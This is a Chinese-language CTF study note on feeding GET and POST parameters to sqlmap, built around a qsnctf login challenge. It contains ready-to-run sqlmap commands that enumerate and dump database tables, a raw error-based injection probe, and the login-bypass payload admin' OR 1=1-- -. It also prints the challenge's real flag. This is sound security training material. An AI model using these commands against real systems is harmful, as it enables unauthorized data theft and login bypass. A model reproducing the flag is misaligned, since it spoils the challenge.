# Web笔记15｜sqlmap 的 GET 与 POST 请求（新手必记重点）

> 一句话：**sqlmap 当然分 GET 和 POST**，而且"怎么把参数喂给它"完全不一样。搞错这一步，sqlmap 连注入点都扫不到。

---

## 1. 先搞清楚：题目是 GET 还是 POST？

动手前先判断题的提交方式，这是用 sqlmap 的第一件事：

| 怎么判断 | 方法 |
|---|---|
| 看页面源码 | 找 `<form method="POST">`（或没写 method 默认 GET） |
| 看提交地址 | `action="xxx.php"` 是提交到哪，不改变请求方式 |
| 抓包/看 Network | 浏览器 F12 → Network 面板，看请求的 Method 列是 GET 还是 POST |
| curl 实测 | `curl -i URL` 看是不是 302/200 + 看表单 |

**记住**：表单的 `action` 只是"提交到哪个 URL"，**不决定 GET/POST**。`method` 才决定。

---

## 2. GET 请求怎么打

GET 的参数直接挂在 URL 的 `?` 后面，sqlmap 能自动识别：

```bash
# 最基本：sqlmap 自己从 URL 里找参数测
python sqlmap.py -u "http://example.com/page.php?id=1"

# 指定只测某个参数（推荐，省时间）
python sqlmap.py -u "http://example.com/page.php?id=1&cat=2" -p id
```

- 参数在 URL 里 → **不用写 `--data`**。
- 可加 `-p 参数名` 指定测哪个（不加就挨个测，慢）。

---

## 3. POST 请求怎么打（本题就是这种）

POST 的参数在**请求体（body）**里，不在 URL 上。必须显式用 `--data` 告诉 sqlmap 请求体长什么样：

```bash
# 本题（qsnctf 登录框）完整起手
python C:\Users\Administrator\Desktop\ctf_tools\sqlmap-master\sqlmap.py ^
  -u "http://challenge.qsnctf.com:40517/" ^
  --data="username=admin&password=admin" ^
  -p username --batch
```

**三个关键点**：
1. `--data="username=admin&password=admin"`：**把 POST 请求体原样给它**。sqlmap 会在这个 body 里插 payload。
2. `-p username`：指定测 `username` 这个 POST 参数（我们已知注入点在这）。
3. `--batch`：非交互模式，所有"按回车继续"的提问自动选默认。**本机这个 dev 版 sqlmap 会卡在 "Press Enter to continue..."，必加**。

### ⚠️ 最容易踩的坑
> **POST 注入忘了写 `--data`** → sqlmap 只会去扫 URL 里的参数。本题 URL 是 `http://...:40517/`，URL 上**根本没有参数**，于是 sqlmap 测了个寂寞，报告"未发现注入"——其实注入点就在 POST body 里。

所以口诀：**参数在 body 里，就一定要 `--data`**。

---

## 4. 判定与命令对照表（背下来）

| 场景 | 题目特征 | sqlmap 关键参数 |
|---|---|---|
| GET 注入 | URL 带 `?id=1`，或表单 `method="GET"` | 参数直接写 URL，`-u "URL?x=1"` |
| POST 注入 | 登录框 `method="POST"`，参数在 body | **必须 `--data="x=1&y=2"`** + `-p 参数` |
| Cookie 注入 | 注入点在 Cookie 里 | `--cookie="PHPSESSID=xxx"` |
| Header 注入 | 注入点在 User-Agent/Referer 等 | `--headers="X-Forwarded-For: *"` 或 `-H "X: *"` |
| 上传点注入 | `multipart/form-data` 上传 | `--forms` 或 `--data` + `--method=POST` |

---

## 5. 本题完整四步链（POST 版，已实测跑通）

```bash
SQLMAP="python C:\Users\Administrator\Desktop\ctf_tools\sqlmap-master\sqlmap.py"
URL="http://challenge.qsnctf.com:40517/"
DATA="--data=username=admin&password=admin -p username"

# ① 检测 + 列库
$SQLMAP -u "$URL" $DATA --batch --dbs
# ② 列业务库的表（业务库=gitctf）
$SQLMAP -u "$URL" $DATA --batch -D gitctf --tables
# ③ 列列
$SQLMAP -u "$URL" $DATA --batch -D gitctf -T flag --columns
# ④ 导出
$SQLMAP -u "$URL" $DATA --batch -D gitctf -T flag --dump
```

- 注入类型：error-based(FLOOR) + time-based blind，后端 MySQL/MariaDB。
- **注意**：本题 DB 里 `flag` 表是**假 flag `flag{This_is_Fake_flag}`（蜜罐）**，真 flag 在登录绕过后的 `admin.php` 页面（`flag{eb343e3467ad4ccf8abfe1c065c6a90a}`）。拖库 ≠ 真 flag，需多来源验证。

---

## 5.5 ⭐ 重点：为什么 sqlmap 不会去测试 `username=admin' OR 1=1-- -`？

这是"人和工具思维方式不同"的典型。直接结论：**`admin' OR 1=1-- -` 是"人"写的登录绕过，sqlmap 根本没这个目标，也不会生成这种 payload。**

### 一句话区分
| | 人（我们） | sqlmap |
|---|---|---|
| 目标 | **登录进门**（绕过校验看 flag） | **盲测注入 + 拖库**（确认漏洞、读数据库） |
| 怎么利用 | 知道是登录框 → `OR 1=1` 让 WHERE 恒真 | 不知道后端 SQL，用通用探针找注入点 |
| 本题结局 | 302 跳 `admin.php` 拿到**真** flag | dump `flag` 表拿到**假** flag（蜜罐） |

### sqlmap 实际测了什么？（本题真实抓到的探针）
它把我们给的基准值 `username=admin` 当"基底"，在后面插它自己的探针：
```
username=admin'||(SELECT 0x54446648 WHERE 3448=3448 AND (SELECT 3821 FROM(SELECT COUNT(*),CONCAT(0x716a627171,(SELECT(ELT(3821=3821,1))),...)x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'
```
这是 **error-based (FLOOR) 报错注入** 探针，跟 `OR 1=1` 完全不是一回事。

### 为什么它不测 `OR 1=1`？
1. **它不知道这是登录查询。** sqlmap 不假设后端 SQL 长什么样，只拿到 `username=admin` 这个值，用通用边界符（`'` `"` `)` 等）+ 通用测试向量去试。
2. **`OR 1=1` 是"登录专用"技巧**，依赖你知道 `WHERE username='$u' AND password='$p'` 这种结构。`OR 1=1` 让整个 WHERE 恒真 → 登录成功。sqlmap 不去建模这种业务语义。
3. **布尔检测它用 AND 而不是 OR。** 为了判断"有没有注入"，sqlmap 需要一对**可观测差异**的响应（TRUE vs FALSE）。它偏好 `admin' AND 6813=6813-- -`（真）对比 `admin' AND 6813=9999-- -`（假）—— AND 保持了原 `username='admin'` 的过滤，只切换附加条件，页面差异干净。而 `OR 1=1` 会把查询"淹没"成返回所有行：在登录框里虽然能成，但在其它注入点（如 `id=1`）会返回一堆行、页面差异不可观测，作为通用探测器不可靠。
4. **目标不同 → 路径不同。** 人用 `OR 1=1` 直接"进门"（登录成功看 flag）；sqlmap 走"窗户"（注入点）→ UNION/报错/盲注把数据库内容拖出来。本题 sqlmap 拿到的假 flag 就是从 DB dump 的，跟登录页面那个真 flag 是两码事——这恰好证明它根本没"登录"。

### 一句话总结
`admin' OR 1=1-- -` 是**人**利用"这是登录框"写的绕过；sqlmap 是"盲测注入 + 拖库"的自动化引擎，用自己的一套通用探针（报错/布尔/时间/UNION）找注入点，然后去读数据库，而不是去登录。两者打的是同一个漏洞，但走的是两条完全不同的路。

> 想亲眼看 sqlmap 发了哪些请求？加 `-v 3`（看 payload）或 `--proxy=http://127.0.0.1:8080`（接 Burp 抓包）。

---

## 5.6 补充澄清：本题的 flag 到底"在哪"？

- **sqlmap 的世界只有数据库。** 它的全部能力都作用在 DBMS 上（`gitctf` 库及里面的表）。它能 dump 出来的，只能是"数据库里存着的数据"。
- **本题真 flag 不在数据库里，而在后端应用（代码/页面）中。** 证据链：sqlmap 把 `gitctf.flag` 表唯一的那行 dump 出来，是 `flag{This_is_Fake_flag}`（诱饵）；而我们用 `admin' OR 1=1-- -` 登录绕过、落地 `admin.php` 后，页面打印出的是 **另一个** `flag{eb343e3467ad4ccf8abfe1c065c6a90a}`。
  - 如果真 flag 也在 `flag` 表里，sqlmap 必然能 dump 到它。既然没 dump 到，说明真 flag **不在那张表里**——它大概率硬编码在 `admin.php` 源码里（或被 `include` 进来的 `flag.php` 里），只有在身份认证通过、页面被执行时才 `echo` 出来。
- **这是出题人故意设计的"双层"**：DB 里放假 flag 误导拖库党；真 flag 放在应用层，必须通过"认证绕过 → 进后台页"这条业务漏洞路径才能拿到。
- **通用原则（务必记住）**：flag 可以存在于任何地方——数据库、源代码、环境变量、配置文件、Cookie、甚至 HTML 注释里。sqlmap 只覆盖"数据库"这一层；其它层要用对应手段（源码审计、文件读取、RCE 等）。**"拖库成功" ≠ "拿到真 flag"**。

---

## 6. 速记口诀

- **GET 参数在 URL，POST 参数在 body**。
- **POST 必写 `--data`，否则 sqlmap 瞎扫**。
- **`-p` 指定参数省时间，`--batch` 防卡顿**。
- 看到登录框 → 先想 POST → 先试 `admin' OR 1=1-- -` 绕过，再用 sqlmap 拖库练手。

---

## 7. 相关笔记
- 本题完整复盘：`WP-[qsnctf]SQL注入登录绕过与sqlmap工作流.md`
- 序列化工具：`serforge使用说明.md`
- 文件包含伪协议：`Web笔记13-PHP文件包含与伪协议全家福.md`
